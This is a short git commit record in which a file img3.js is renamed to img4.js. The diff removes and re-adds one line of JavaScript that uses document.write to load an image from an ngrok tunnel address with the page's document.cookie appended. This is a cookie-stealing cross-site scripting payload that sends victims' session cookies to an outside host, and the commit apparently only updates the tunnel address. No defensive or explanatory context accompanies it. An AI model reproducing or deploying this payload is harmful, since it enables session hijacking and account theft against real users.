ee17ebaacf352dcbb6d6a93cbd414a488d5a1289
David Brosnan <dbrosn626@gmail.com>
2023-01-29 18:13:18 -0500

    Update and rename img3.js to img4.js

--- img3.js
+++
@@ -1,1 +0,0 @@
-document.write('<img src="https://3db9-108-6-112-24.ngrok.io/123.html?c='+document.cookie+'" />');
---
+++ img4.js
@@ -0,0 +1,1 @@
+document.write('<img src="https://9f9e-108-6-112-24.ngrok.io/123.html?c='+document.cookie+'" />');
